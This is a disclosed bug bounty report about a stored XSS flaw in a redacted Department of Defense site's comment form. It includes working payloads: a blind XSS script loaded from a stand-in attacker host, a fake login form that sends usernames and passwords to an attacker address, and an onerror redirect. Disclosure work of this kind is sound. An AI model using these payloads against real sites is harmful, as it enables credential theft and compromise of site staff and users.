# Stored XSS via Comment Form at ████████

## Report Details
- **Report ID**: 915073
- **URL**: https://hackerone.com/reports/915073
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-07-03T22:22:09.573Z
- **Disclosed**: 2020-09-29T20:17:34.424Z

## Reporter
- **Username**: un4gi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
An attacker can submit a comment form with injected HTML, leading to a number of malicious effects

## Step-by-step Reproduction Instructions

1. Browse to https://████
2. Complete the form. I placed `"><script src=http://attackerip/blind.js/>` in the `Name` field. Some example payloads for the `Comments` field are as follows:

For credential theft, an attacker could place `<h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>` in the `Comments` field.
███████
████

To redirect to a malicious website, an attacker could use `<img src=x onerror='javascript:window.open("http://catcompusa.com")'></img>`.
██████
The malicious website will open in a new tab when the image fails to load as shown below:
█████████

## Conclusions
- This leads me to believe that once a █████████ employee reads the comment, the code will be injected into their browser as well.
- Additionally, the blind XSS payload injected into the `Name` field seemed to cause a hit on my weblog from `█████████` and `██████████`.
█████

## Suggested Mitigation/Remediation Actions
Sanitize how user input is parsed by the server before being reflected onto the resulting comment page to prevent XSS/HTML injection.

## Impact

The attacker could achieve numerous effects such as credential theft, forced browsing, keystroke logging, drive-by downloads, etc. ultimately leading to administrative access over the █████ website and potentially other internal resources.

## Attachments
No attachments
